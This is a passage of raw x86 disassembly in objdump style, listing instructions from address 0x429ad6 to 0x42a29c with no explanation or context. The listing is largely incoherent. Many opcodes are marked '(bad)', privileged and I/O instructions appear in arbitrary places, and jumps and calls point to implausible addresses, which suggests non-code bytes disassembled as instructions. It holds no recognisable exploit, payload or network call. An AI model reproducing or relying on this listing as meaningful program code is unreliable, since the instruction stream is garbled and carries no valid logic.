  429ad6:	mov    esi,0x457251
  429adb:	cmp    dh,al
  429add:	pushf  
  429ade:	inc    ebp
  429adf:	(bad)  
  429ae0:	mov    edi,eax
  429ae2:	or     al,0x85
  429ae4:	add    al,bh
  429ae6:	inc    eax
  429ae8:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  429aec:	or     ah,bh
  429aee:	inc    eax
  429aef:	push   eax
  429af0:	jmp    0x429b43
  429af2:	mov    eax,DWORD PTR ds:0xe8720c
  429af8:	mov    DWORD PTR [ebp-0x8],eax
  429afb:	jne    0x429b42
  429afd:	jmp    0x429a8a
  429aff:	mov    ebp,DWORD PTR [eax]
  429b01:	clc    
  429b02:	retf   0xff50
  429b05:	push   ecx
  429b06:	mov    DWORD PTR ds:0x757210,eax
  429b0c:	mov    ecx,DWORD PTR [ebp-0x4]
  429b0f:	sub    esp,DWORD PTR [ebx-0x77]
  429b12:	dec    DWORD PTR [eax*4-0x74ca8abb]
  429b19:	or     ah,bh
  429b1b:	pop    es
  429b1c:	ds cwde 
  429b1e:	push   DWORD PTR [edx]
  429b20:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  429b26:	(bad)  
  429b27:	mov    bh,bh
  429b29:	jmp    0x429b17
  429b2b:	leave  
  429b2c:	jne    0x429b36
  429b2e:	call   0x2f9488
  429b33:	in     al,dx
  429b34:	dec    ebp
  429b35:	add    dh,BYTE PTR [ebx]
  429b37:	add    BYTE PTR [ebx],al
  429b39:	inc    ebp
  429b3a:	cmp    edi,DWORD PTR [eax]
  429b3c:	je     0x429ada
  429b3e:	mov    eax,edi
  429b40:	or     al,0xf0
  429b42:	add    BYTE PTR [ebp+0x458bf845],al
  429b48:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  429b4e:	adc    al,0x7
  429b50:	enter  0x9fc0,0xa5
  429b54:	rol    BYTE PTR [eax],0x5e
  429b57:	mov    ecx,ecx
  429b59:	or     al,0xc
  429b5b:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  429b62:	jmp    0x429b63
  429b64:	push   ebp
  429b65:	mov    esp,ebp
  429b67:	cld    
  429b68:	inc    ebp
  429b69:	inc    ebp
  429b6a:	or     DWORD PTR [ecx+0x457dec10],0x0
  429b71:	push   esi
  429b72:	push   esi
  429b73:	mov    edi,0x7af080f
  429b78:	add    bh,al
  429b7a:	test   DWORD PTR [eax+0x3a7320f],ebx
  429b80:	add    BYTE PTR [ecx+0x4540100f],cl
  429b86:	mov    ebp,eax
  429b88:	mov    ebp,edi
  429b8a:	lock call edx
  429b8d:	fcom   DWORD PTR [ebp+0x45]
  429b90:	mov    eax,0x148a8b
  429b95:	push   ecx
  429b96:	enter  0xc145,0x83
  429b9a:	cmp    cl,BYTE PTR [eax]
  429b9c:	add    BYTE PTR [ebp+0x4d],al
  429b9f:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  429ba5:	call   0xffa29714
  429baa:	cmp    eax,DWORD PTR [ebp-0xc]
  429bad:	jmp    DWORD PTR [eax+edx*1-0x4e]
  429bb1:	push   ebp
  429bb2:	(bad)
  429bb5:	std    
  429bb6:	lock push DWORD PTR [edi+0x5d08fcdb]
  429bbd:	inc    ebp
  429bbe:	(bad)  
  429bbf:	call   0xff7c984f
  429bc4:	add    al,BYTE PTR [ebp+0x37]
  429bc7:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  429bcd:	jne    0x429bcf
  429bcf:	(bad)  
  429bd0:	cmp    edi,esp
  429bd2:	jne    0x429c05
  429bd4:	mov    edi,edi
  429bd6:	or     BYTE PTR [ebx-0x307f0b49],cl
  429bdc:	pop    ds
  429bdd:	into   
  429bde:	je     0x429ba1
  429be0:	mov    ebx,DWORD PTR [esi]
  429be2:	or     BYTE PTR [ebp-0x49],al
  429be5:	mov    esp,DWORD PTR [esi-0x77]
  429be8:	mov    esi,0xfc451f0c
  429bed:	mov    eax,DWORD PTR [eax]
  429bef:	or     al,0x66
  429bf1:	sar    bl,0x3b
  429bf4:	xor    esi,DWORD PTR [ebp+0x66]
  429bf7:	xor    ecx,edi
  429bf9:	pop    edi
  429bfa:	adc    bl,BYTE PTR [ebx+0x78]
  429bfd:	ret    0xff
  429c00:	cld    
  429c01:	inc    ebp
  429c02:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  429c08:	cld    
  429c09:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  429c10:	push   0xffffff83
  429c12:	pop    edi
  429c13:	or     BYTE PTR [ebp+0x53],dh
  429c16:	xorps  xmm1,xmm2
  429c19:	test   BYTE PTR [eax+eax*1],bh
  429c1c:	add    BYTE PTR [eax],al
  429c1e:	adc    eax,eax
  429c20:	add    DWORD PTR [eax+edi*2-0xff7b00],0xffffffb7
  429c28:	jmp    DWORD PTR [eax]
  429c2a:	ror    al,0x5e
  429c2d:	inc    ebp
  429c2e:	leave  
  429c2f:	xor    ecx,DWORD PTR [eax]
  429c31:	and    DWORD PTR [ebx-0x3ec90708],ecx
  429c37:	add    ch,al
  429c39:	xor    edi,edi
  429c3b:	xor    DWORD PTR [ebx],0x660033fc
  429c41:	mov    DWORD PTR [ebp-0xc],ecx
  429c44:	pcmpgtw mm0,mm0
  429c47:	add    dl,ah
  429c49:	leave  
  429c4a:	mov    edi,DWORD PTR [esi-0x7d]
  429c4d:	push   ax
  429c4f:	dec    ebp
  429c50:	mov    esi,DWORD PTR [ebx-0x75]
  429c53:	lea    ebp,[eax-0x7c00fffc]
  429c59:	xor    eax,DWORD PTR [eax]
  429c5b:	sysret 
  429c5d:	dec    ebp
  429c5e:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  429c65:	push   WORD PTR [ecx+0x8]
  429c69:	jne    0x429c2c
  429c6b:	ud0    ecx,DWORD PTR [ecx]
  429c6e:	mov    esi,DWORD PTR [edx]
  429c70:	lods   al,BYTE PTR ds:[esi]
  429c71:	add    BYTE PTR [eax],al
  429c73:	data16 (bad) 
  429c75:	iret   
  429c76:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  429c7d:	cli    
  429c7e:	inc    ebp
  429c7f:	cmp    al,0x8d
  429c81:	add    BYTE PTR [esi+0x2d],ah
  429c84:	inc    ebp
  429c85:	pop    ebp
  429c86:	lea    ecx,[edi]
  429c88:	mov    dl,bh
  429c8a:	add    BYTE PTR [edi],cl
  429c8c:	mov    DWORD PTR [eax+eax*8],edi
  429c8f:	mov    ebx,0x3a87
  429c94:	add    BYTE PTR [ebx],ch
  429c96:	inc    ebp
  429c97:	data16 (bad) 
  429c99:	clc    
  429c9a:	int3   
  429c9b:	cmp    eax,DWORD PTR [eax]
  429c9d:	je     0x429c28
  429c9f:	push   0xffffffc8
  429ca1:	pop    edi
  429ca2:	xchg   DWORD PTR [ebp+0x0],eax
  429ca5:	data16 add BYTE PTR [ebp+0x45],cl
  429ca9:	lea    cx,[ebp+0x10]
  429cad:	jb     0x429caf
  429caf:	jmp    0x429c3a
  429cb1:	call   eax
  429cb3:	clc    
  429cb4:	xchg   DWORD PTR [edi+0x1],edi
  429cb7:	mov    eax,DWORD PTR [eax]
  429cb9:	or     BYTE PTR [ebp-0x49],al
  429cbc:	lea    eax,[eax+0x74003154]
  429cc2:	push   edi
  429cc3:	inc    edx
  429cc4:	jge    0x429cc5
  429cc6:	mov    DWORD PTR [edi],ecx
  429cc8:	fdiv   DWORD PTR [edi-0x6]
  429ccb:	inc    DWORD PTR [eax]
  429ccd:	xor    edx,DWORD PTR [eax+0x5f]
  429cd0:	xchg   DWORD PTR [ebx+0x1],ebx
  429cd3:	ret    0x0
  429cd6:	xor    BYTE PTR [ebp-0x51],cl
  429cd9:	cmp    edi,0xf0ff8904
  429cdf:	data16 ror al,0x84
  429ce3:	rol    BYTE PTR [eax],0x3b
  429ce6:	add    al,dh
  429ce8:	dec    eax
  429ce9:	xchg   esp,eax
  429cea:	push   ebx
  429ceb:	jmp    0x429c78
  429ced:	push   ebp
  429cee:	add    esp,ebp
  429cf0:	add    ebp,esp
  429cf2:	mov    edx,DWORD PTR [edi+0x24]
  429cf5:	clc    
  429cf6:	dec    esi
  429cf7:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  429cfd:	cmp    BYTE PTR [ebx],al
  429cff:	jne    0x429c8a
  429d01:	xor    esp,eax
  429d03:	jmp    0x459e86
  429d08:	add    ebp,DWORD PTR [ecx+ecx*4]
  429d0b:	jne    0x429d01
  429d0d:	call   0xffcc9a67
  429d12:	clc    
  429d13:	xchg   edi,eax
  429d14:	sti    
  429d15:	add    DWORD PTR [ebx],eax
  429d17:	add    BYTE PTR [ebp+0x47],bl
  429d1a:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  429d20:	pop    ebp
  429d21:	mov    DWORD PTR [esi-0x48],esi
  429d24:	jmp    0x429d6d
  429d26:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  429d2c:	(bad)  
  429d2e:	cmp    al,0x0
  429d30:	cmp    eax,DWORD PTR [ebp+0x18]
  429d33:	lea    ebx,[ebp-0x56]
  429d36:	jle    0x429d38
  429d38:	jae    0x429cc3
  429d3a:	mov    eax,esp
  429d3c:	call   0xb900:0x8b005587
  429d43:	inc    ebp
  429d44:	push   ebp
  429d45:	lea    ecx,[ebp-0x27ff4f12]
  429d4b:	mov    eax,edi
  429d4d:	int3   
  429d4e:	push   ebp
  429d4f:	xchg   edi,eax
  429d51:	add    esp,ebp
  429d53:	add    BYTE PTR [eax],al
  429d55:	inc    ebp
  429d56:	add    BYTE PTR [ebp+0x8b3255],cl
  429d5c:	cld    
  429d5d:	mov    DWORD PTR [edx],edi
  429d5f:	aam    0x75
  429d61:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  429d67:	mov    DWORD PTR [ebx-0x50],edx
  429d6a:	test   BYTE PTR [ebp-0x1],0xe8
  429d6e:	mov    eax,DWORD PTR [eax]
  429d70:	hlt    
  429d71:	add    al,al
  429d73:	mov    eax,DWORD PTR ds:0x890045a8
  429d79:	dec    DWORD PTR [ebx+0x45fdf0e8]
  429d7f:	inc    DWORD PTR [eax*2+0xf75854d]
  429d86:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  429d8c:	call   0x7298facd
  429d91:	je     0x429df1
  429d93:	js     0x429df4
  429d95:	lock ret 0x7e
  429d99:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  429d9f:	mov    edi,edi
  429da1:	sbb    al,bl
  429da3:	clc    
  429da4:	add    BYTE PTR [ebp-0x73],bh
  429da7:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  429dad:	ror    BYTE PTR [eax],1
  429daf:	dec    ebp
  429db0:	xchg   ebp,eax
  429db1:	mov    edi,edi
  429db3:	in     al,0x8b
  429db5:	jge    0x429d40
  429db7:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  429dbd:	clc    
  429dbe:	pop    esi
  429dbf:	fist   DWORD PTR [ebp+0x5d398b5d]
  429dc5:	clc    
  429dc6:	add    al,0x6e
  429dc8:	mov    eax,DWORD PTR [ebx]
  429dca:	mov    BYTE PTR [ebp+0x0],dl
  429dcd:	mov    edx,DWORD PTR [ebx-0x20]
  429dd0:	adc    esi,DWORD PTR [edi+0x5e005f36]
  429dd6:	add    eax,0x3b3a73
  429ddb:	adc    al,0x89
  429ddd:	pop    eax
  429dde:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  429de2:	ret    0xf08
  429de5:	cmp    al,0x2
  429de7:	mov    DWORD PTR [edx],esi
  429de9:	cld    
  429dea:	add    BYTE PTR [ebp+0x66],dl
  429ded:	add    eax,ebx
  429def:	add    esp,eax
  429df1:	sub    eax,eax
  429df3:	or     BYTE PTR [ecx-0x77f474bb],cl
  429df9:	add    BYTE PTR [eax],al
  429dfb:	mov    DWORD PTR [ebx-0x24],ebx
  429dfe:	push   edi
  429dff:	push   ebp
  429e00:	clc    
  429e01:	add    DWORD PTR [esi+0x1b0100],0x45
  429e08:	out    0xff,eax
  429e0a:	add    edx,DWORD PTR [eax]
  429e0c:	jmp    0x429df6
  429e0e:	cmp    ch,0x43
  429e11:	(bad)  
  429e12:	jmp    0x40c82664
  429e17:	je     0x429da3
  429e19:	mov    eax,DWORD PTR [eax-0x10c78704]
  429e1f:	inc    ebp
  429e20:	add    BYTE PTR [ebx-0x770375],al
  429e26:	add    ah,ch
  429e28:	add    edx,esp
  429e2a:	pop    edi
  429e2b:	pop    ebp
  429e2c:	push   ebp
  429e2d:	inc    ebx
  429e2e:	in     al,dx
  429e2f:	pop    ebp
  429e30:	in     al,dx
  429e31:	cmp    edx,DWORD PTR [edi-0x8]
  429e34:	cmp    BYTE PTR [esp+ebx*4-0x173676a5],dl
  429e3b:	add    al,0x47
  429e3d:	push   ebp
  429e3e:	mov    esp,ebp
  429e40:	in     al,0x45
  429e42:	dec    ebp
  429e43:	push   esi
  429e44:	test   DWORD PTR [eax+0xff010f],esi
  429e4a:	add    BYTE PTR [eax+0xc018b],dh
  429e50:	leave  
  429e51:	inc    ebp
  429e52:	test   al,ch
  429e54:	add    dh,bh
  429e56:	add    bh,bh
  429e58:	dec    ebp
  429e59:	push   cs
  429e5a:	mov    DWORD PTR [ecx],eax
  429e5c:	hlt    
  429e5d:	push   es
  429e5e:	dec    ebp
  429e5f:	leave  
  429e60:	mov    DWORD PTR [eax],ecx
  429e62:	clc    
  429e63:	cmovge eax,ecx
  429e66:	mov    ecx,0x85c2f0
  429e6c:	clc    
  429e6d:	pop    DWORD PTR [ebp+0x1]
  429e70:	aas    
  429e71:	add    BYTE PTR [ebx+ebp*8-0x7582caad],bl
  429e78:	push   esi
  429e79:	add    BYTE PTR [ebp-0x4],al
  429e7c:	mov    DWORD PTR [eax],eax
  429e7e:	cld    
  429e7f:	inc    bp
  429e81:	add    DWORD PTR [edx],edi
  429e83:	rcr    DWORD PTR [ebx+eax*4-0x48f7fd42],0x7
  429e8b:	mov    ebx,0xcd4f68
  429e90:	mov    edi,DWORD PTR [ebx]
  429e92:	or     al,0x75
  429e94:	(bad)  
  429e95:	xor    ecx,ebx
  429e97:	enterw 0x4d01,0x87
  429e9c:	jmp    0x429ea2
  429ea1:	ret    
  429ea2:	inc    ebp
  429ea3:	mov    ecx,DWORD PTR [ebx-0x3977f375]
  429ea9:	add    dh,cl
  429eab:	ror    DWORD PTR [esi+eax*1+0xa64c730],0x8b
  429eb3:	icebp  
  429eb4:	or     BYTE PTR [eax+0x8f13bd2],al
  429eba:	inc    ebp
  429ebb:	inc    edx
  429ebc:	mov    ecx,DWORD PTR [edx]
  429ebe:	or     al,0xf9
  429ec0:	(bad)  
  429ec1:	jne    0x429e91
  429ec3:	mov    cl,0x0
  429ec6:	rol    BYTE PTR [esi+0x450134],1
  429ecc:	add    eax,edi
  429ece:	cld    
  429ecf:	ret    
  429ed0:	dec    ebp
  429ed1:	mov    ecx,DWORD PTR [edx+0x751c8583]
  429ed7:	mov    edi,0xf82c8534
  429edc:	jmp    0x429f5b
  429ede:	mov    ecx,DWORD PTR [ebp+0x45f101f0]
  429ee4:	mov    dl,0x8b
  429ee6:	sub    cl,BYTE PTR [eax]
  429ee8:	mov    ecx,ecx
  429eea:	in     al,dx
  429eeb:	test   cl,dh
  429eed:	add    BYTE PTR [edx],al
  429eef:	add    BYTE PTR [eax-0x377a97b3],al
  429ef5:	cmovge esi,esp
  429ef8:	add    eax,DWORD PTR [eax]
  429efa:	cld    
  429efb:	mov    eax,DWORD PTR [ecx]
  429efd:	adc    BYTE PTR [ebp+0x4d],cl
  429f00:	mov    ecx,DWORD PTR [ebx+0x4d980ce8]
  429f06:	xor    cl,BYTE PTR [ebx+0x4533082b]
  429f0c:	cmp    esp,ebx
  429f0e:	jne    0x429eac
  429f10:	mov    eax,edi
  429f12:	adc    ah,ch
  429f14:	push   ebp
  429f15:	test   DWORD PTR [ebx],esi
  429f17:	clc    
  429f18:	xor    ecx,DWORD PTR [ecx-0x76d417d5]
  429f1e:	xor    ecx,DWORD PTR [ecx+ecx*4]
  429f21:	dec    ebp
  429f22:	adc    bh,al
  429f24:	push   0x8b85ff10
  429f29:	clc    
  429f2a:	or     al,0x50
  429f2c:	(bad)  
  429f2d:	push   ecx
  429f2e:	retf   
  429f2f:	mov    ebx,0xff4d8dc8
  429f34:	mov    DWORD PTR [ebp+0x8],eax
  429f37:	xor    eax,DWORD PTR [ebp-0x75]
  429f3a:	cmp    ebp,DWORD PTR [ebx]
  429f3c:	lsl    ebx,WORD PTR [edi-0x8]
  429f40:	call   DWORD PTR [ebx-0x741bff75]
  429f46:	(bad)  
  429f47:	or     al,0x5b
  429f49:	dec    ebp
  429f4a:	or     BYTE PTR [ebx],dh
  429f4c:	inc    ebp
  429f4d:	xor    esi,DWORD PTR ds:0x708088d
  429f53:	in     eax,0x98
  429f55:	add    BYTE PTR [edx],dh
  429f57:	inc    ebp
  429f58:	pop    edi
  429f59:	xor    eax,edx
  429f5b:	test   DWORD PTR [eax],0x81108b8b
  429f61:	dec    ebp
  429f62:	sub    al,0x33
  429f64:	add    BYTE PTR [ebx],dh
  429f66:	push   esi
  429f67:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  429f6d:	mov    edi,eax
  429f6f:	or     BYTE PTR [ebp+0x45],al
  429f72:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  429f78:	cmp    cl,cl
  429f7a:	pushf  
  429f7b:	push   es
  429f7c:	mov    DWORD PTR [ebx-0x4],0xf817853b
  429f83:	dec    ebp
  429f84:	inc    ebp
  429f85:	and    BYTE PTR [eax],0x50
  429f88:	pushf  
  429f89:	push   0x4de4d1c7
  429f8e:	xchg   BYTE PTR [eax-0x3dbaaf08],al
  429f94:	fsubr  st,st(1)
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	rol    bh,cl
  429f99:	mov    edx,esp
  429f9b:	or     BYTE PTR [ebp+0x4588f84d],al
  429fa1:	mov    ecx,DWORD PTR [eax]
  429fa3:	or     BYTE PTR [eax],al
  429fa5:	push   ebp
  429fa6:	mov    edi,DWORD PTR [eax+0xfc728b]
  429fac:	dec    ebp
  429fad:	enter  0xceba,0x8
  429fb1:	retf   0x1807
  429fb4:	ret    0x984d
  429fb7:	mov    esi,DWORD PTR [edx]
  429fb9:	or     al,0x33
  429fbb:	into   
  429fbc:	add    edx,esi
  429fbe:	add    ecx,edx
  429fc0:	bswap  eax
  429fc2:	ror    esi,0x98
  429fc5:	dec    ebp
  429fc6:	add    cl,ch
  429fc8:	mov    edi,edi
  429fca:	hlt    
  429fcb:	inc    esi
  429fcd:	inc    ebp
  429fce:	ret    0x4533
  429fd1:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  429fd7:	or     BYTE PTR [ebx],dh
  429fd9:	dec    ebp
  429fda:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  429fe0:	jne    0xff8c9fa7
  429fe6:	inc    ebp
  429fe7:	inc    ebp
  429fe8:	mov    esi,DWORD PTR [ebx]
  429fea:	clc    
  429feb:	pop    esi
  429fec:	ret    0xcaeb
  429fef:	mov    eax,esi
  429ff1:	call   0x5203f0c4
  429ff6:	dec    ebp
  429ff7:	add    eax,0xf8728b
  429ffc:	adc    eax,0xce0ccac9
  42a001:	push   ebp
  42a002:	ret    0xc6ec
  42a005:	in     al,dx
  42a006:	call   0x3342ed0f
  42a00b:	push   edi
  42a00c:	add    edi,eax
  42a00e:	xor    eax,eax
  42a010:	jmp    0x42a057
  42a012:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  42a018:	add    eax,edi
  42a01a:	shr    eax,cl
  42a01c:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  42a022:	mov    edi,DWORD PTR [ecx]
  42a024:	in     al,dx
  42a025:	pushf  
  42a026:	ret    0x84c7
  42a029:	fcomp  DWORD PTR [eax-0x7607cd7b]
  42a02f:	inc    ebp
  42a030:	in     al,dx
  42a031:	cmp    BYTE PTR [ebp-0x64],al
  42a034:	mov    eax,edi
  42a036:	cld    
  42a037:	fmul   st(2),st
  42a039:	sbb    dl,al
  42a03b:	jmp    0x9c3b:0x374d45c1
  42a042:	jbe    0x42a00b
  42a044:	mov    esp,eax
  42a046:	clc    
  42a047:	add    BYTE PTR [ebp+0x0],cl
  42a04a:	mov    ecx,ecx
  42a04c:	lea    eax,[ebp-0x5]
  42a04f:	mov    edi,edi
  42a051:	call   0x51cdf09b
  42a056:	hlt    
  42a057:	xor    eax,edx
  42a059:	mov    esi,0x987284
  42a05e:	xor    cl,dl
  42a060:	mov    esi,eax
  42a062:	hlt    
  42a063:	into   
  42a064:	inc    ebp
  42a065:	scas   eax,DWORD PTR es:[edi]
  42a066:	mov    ebp,ecx
  42a068:	cld    
  42a069:	add    dl,cl
  42a06b:	add    dl,al
  42a06d:	inc    ebp
  42a06e:	shr    DWORD PTR [ebx],0x4d
  42a071:	xor    edi,DWORD PTR [ebx]
  42a073:	mov    DWORD PTR [edi],ecx
  42a075:	clc    
  42a076:	dec    esi
  42a077:	inc    ebp
  42a078:	dec    DWORD PTR [ebx-0x3d2b1775]
  42a07e:	ret    0xc6ca
  42a081:	mov    BYTE PTR [ebp-0x32],0x53
  42a085:	scas   eax,DWORD PTR es:[edi]
  42a086:	inc    ebp
  42a087:	jmp    0x42a0c0
  42a089:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  42a090:	pop    ebx
  42a091:	xor    ecx,DWORD PTR [ebp+0x3]
  42a094:	mov    eax,DWORD PTR [ebx]
  42a096:	clc    
  42a097:	test   edx,ecx
  42a099:	mov    ecx,esi
  42a09b:	cld    
  42a09c:	call   0x8ab6e5e6
  42a0a1:	xor    ecx,DWORD PTR [eax+0x4533f303]
  42a0a7:	add    ecx,DWORD PTR [ebx-0x4974072d]
  42a0ad:	fdiv   QWORD PTR [ebx]
  42a0af:	retf   0xce89
  42a0b2:	in     al,0xc1
  42a0b4:	inc    ebp
  42a0b5:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  42a0bb:	into   
  42a0bc:	mov    dh,0xc1
  42a0bf:	call   0x8c16e648
  42a0c4:	(bad)  
  42a0c5:	cld    
  42a0c6:	mov    ecx,DWORD PTR [ebp-0x14]
  42a0c9:	xor    eax,ecx
  42a0cb:	lea    eax,[ebp+0x8]
  42a0ce:	mov    esi,DWORD PTR [edx-0x4]
  42a0d1:	add    dl,al
  42a0d3:	inc    ebp
  42a0d4:	mov    esp,0x32d8988b
  42a0d9:	dec    ebp
  42a0da:	mov    esi,DWORD PTR [ebx]
  42a0dc:	cld    
  42a0dd:	xor    eax,edx
  42a0df:	sub    ebp,DWORD PTR [eax-0x75]
  42a0e2:	int    0xec
  42a0e4:	sub    ecx,eax
  42a0e6:	add    esp,DWORD PTR [ecx-0x74b2ba20]
  42a0ec:	mov    esi,esp
  42a0ee:	call   0x3416ee77
  42a0f3:	inc    DWORD PTR [ebx]
  42a0f5:	mov    edi,DWORD PTR [ebx]
  42a0f7:	cld    
  42a0f8:	jne    0x42a147
  42a0fa:	mov    esi,DWORD PTR [ebx]
  42a0fc:	aam    0x8d
  42a0fe:	dec    ebp
  42a0ff:	or     BYTE PTR [ebx],dh
  42a101:	jb     0x42a106
  42a103:	add    BYTE PTR [edi+0x45],bl
  42a106:	ror    DWORD PTR [ebx+0x4d55e4c9],0xec
  42a10d:	xor    ebp,esp
  42a10f:	xor    eax,edi
  42a111:	sub    edi,esp
  42a113:	mov    eax,DWORD PTR [ebp+0x39c8f8f4]
  42a119:	xchg   BYTE PTR [edi+edi*8+0x45e8ff89],bl
  42a120:	inc    ebp
  42a121:	xor    ecx,DWORD PTR [ecx+0x45891403]
  42a127:	clc    
  42a128:	mov    eax,edi
  42a12a:	nop
  42a12b:	fadd   QWORD PTR [eax]
  42a12d:	xchg   BYTE PTR [ebx+0xdb14f8],cl
  42a133:	jmp    0x42a0be
  42a135:	mov    eax,DWORD PTR [ecx]
  42a137:	fadd   DWORD PTR [eax]
  42a139:	inc    ebp
  42a13a:	or     DWORD PTR [ebx],esi
  42a13c:	dec    eax
  42a13d:	add    edx,DWORD PTR [ebx-0x2d]
  42a140:	dec    ebp
  42a141:	mov    DWORD PTR [ebx+0x5707fcec],ecx
  42a147:	inc    ebp
  42a148:	push   eax
  42a149:	mov    dl,BYTE PTR [ecx-0xd]
  42a14c:	xor    ecx,DWORD PTR [ebp-0x45]
  42a14f:	(bad)  
  42a151:	rol    BYTE PTR [eax],0xc1
  42a154:	ret    
  42a155:	inc    ebp
  42a156:	inc    ebp
  42a157:	mov    ecx,DWORD PTR [ebx-0x38b20324]
  42a15d:	xor    eax,ebx
  42a15f:	add    eax,DWORD PTR [ebp+0x23]
  42a162:	mov    ecx,DWORD PTR [ebx-0x4bf7a08]
  42a168:	cmp    edi,0xc
  42a16b:	dec    ebp
  42a16c:	inc    ebp
  42a16d:	xor    ecx,DWORD PTR [ebx+0x40f8f889]
  42a173:	inc    ebp
  42a174:	mov    esi,DWORD PTR [ebx]
  42a176:	clc    
  42a177:	lea    eax,[ebp+0x45725407]
  42a17d:	add    BYTE PTR [ebp+eax*2-0x75],dh
  42a181:	xor    edi,DWORD PTR [eax]
  42a183:	mov    ecx,0xff8b8d4d
  42a188:	push   esp
  42a189:	enter  0x4df7,0x23
  42a18d:	mov    DWORD PTR [ebx+0x4045f8e0],ecx
  42a193:	mov    eax,DWORD PTR [ebx]
  42a195:	loopne 0x42a182
  42a197:	ret    0xc68b
  42a19a:	push   esp
  42a19b:	enter  0x9745,0x8b
  42a19f:	inc    ebp
  42a1a0:	cld    
  42a1a1:	mov    eax,edi
  42a1a3:	clc    
  42a1a4:	ret    
  42a1a5:	ret    0xc645
  42a1a8:	mov    esi,DWORD PTR [ebx]
  42a1aa:	cld    
  42a1ab:	pop    esi
  42a1ac:	mov    ebx,0x83458bc3
  42a1b2:	mov    ebp,DWORD PTR [esp+edi*8+0x45]
  42a1b6:	dec    ebp
  42a1b7:	cmp    BYTE PTR [ebx],dh
  42a1b9:	pushf  
  42a1ba:	add    edi,DWORD PTR [edx-0x7767a77]
  42a1c0:	fcom   DWORD PTR [ebp+0x45]
  42a1c3:	mov    edi,DWORD PTR [edx]
  42a1c5:	adc    al,0x9c
  42a1c7:	inc    ebp
  42a1c8:	(bad)  
  42a1c9:	mov    ebx,eax
  42a1cb:	adc    al,0x85
  42a1cd:	cmp    al,0x1
  42a1d0:	inc    ebp
  42a1d1:	add    BYTE PTR [ecx*2-0x74167464],bh
  42a1d8:	add    edx,DWORD PTR [eax-0x74bb0000]
  42a1de:	xor    eax,DWORD PTR [ebx]
  42a1e0:	add    edi,DWORD PTR [ecx+ecx*4]
  42a1e3:	mov    esp,esi
  42a1e5:	clc    
  42a1e6:	inc    ebp
  42a1e7:	inc    ebp
  42a1e8:	add    edx,DWORD PTR [esi+0xc]
  42a1eb:	mov    edi,0x7ff0845
  42a1f0:	in     al,dx
  42a1f1:	(bad)  
  42a1f2:	jne    0x42a18c
  42a1f4:	mov    esi,DWORD PTR [edx]
  42a1f6:	clc    
  42a1f7:	add    ebp,DWORD PTR [edx]
  42a1f9:	mov    edi,edi
  42a1fb:	in     al,dx
  42a1fc:	mov    DWORD PTR [ebp-0x10],eax
  42a1ff:	xor    eax,DWORD PTR [ebp+0x3]
  42a202:	and    BYTE PTR [ecx+0x458bf49c],cl
  42a208:	fmul   DWORD PTR [ebx-0x173caf39]
  42a20e:	lea    ecx,[ecx+0x45e8d4bc]
  42a214:	clc    
  42a215:	mov    edi,edi
  42a217:	cmp    BYTE PTR [ebp+0x4d],al
  42a21a:	test   DWORD PTR [eax+0x74],ecx
  42a21d:	inc    ecx
  42a21e:	mov    ecx,DWORD PTR [ebx+0x18c7f8d8]
  42a224:	ret    
  42a225:	inc    eax
  42a226:	dec    DWORD PTR [ebx+0x4945f8f0]
  42a22c:	push   eax
  42a22d:	dec    eax
  42a22e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a22f:	sar    bh,1
  42a231:	enter  0x458b,0xec
  42a235:	mov    eax,DWORD PTR [ebp+0x38]
  42a238:	mov    eax,ecx
  42a23a:	fadd   DWORD PTR [ebx]
  42a23c:	dec    ebp
  42a23d:	inc    eax
  42a23e:	sub    ecx,DWORD PTR [ecx+0x45d81489]
  42a244:	inc    ebp
  42a245:	xor    ecx,DWORD PTR [ebx+0x4089f003]
  42a24b:	fadd   QWORD PTR [ebx]
  42a24d:	inc    ebp
  42a24e:	or     al,0x33
  42a250:	dec    ebp
  42a251:	add    edi,DWORD PTR [ebx]
  42a253:	mov    DWORD PTR [edx-0x28],esi
  42a256:	mov    eax,DWORD PTR [ebp-0x10]
  42a259:	mov    eax,DWORD PTR [eax+0x10]
  42a25c:	mov    eax,edi
  42a25e:	lock ret 
  42a260:	inc    ecx
  42a261:	add    DWORD PTR [ebx-0x3e3827ab],ecx
  42a267:	fsubr  st,st(5)
  42a269:	test   DWORD PTR [eax],eax
  42a26b:	clc    
  42a26c:	push   0x45
  42a26e:	(bad)  
  42a26f:	cmp    ebp,esp
  42a271:	pushf  
  42a272:	inc    ebp
  42a273:	(bad)  
  42a274:	push   eax
  42a275:	fcomp  DWORD PTR [ebp+eax*4-0x1]
  42a279:	clc    
  42a27a:	mov    eax,0xf8008584
  42a27f:	mov    eax,DWORD PTR [ebp-0x4]
  42a282:	mov    edi,0x4585c3cc
  42a288:	clc    
  42a289:	mov    eax,DWORD PTR [ebp+0x14]
  42a28c:	cmp    al,BYTE PTR [ebp-0x64]
  42a28f:	mov    edi,eax
  42a291:	in     al,dx
  42a292:	les    esi,FWORD PTR [ebp-0x7b]
  42a295:	mov    edi,eax
  42a297:	or     al,0x4d
  42a299:	dec    ebp
  42a29a:	mov    eax,ebp
  42a29c:	in     al,0xf2
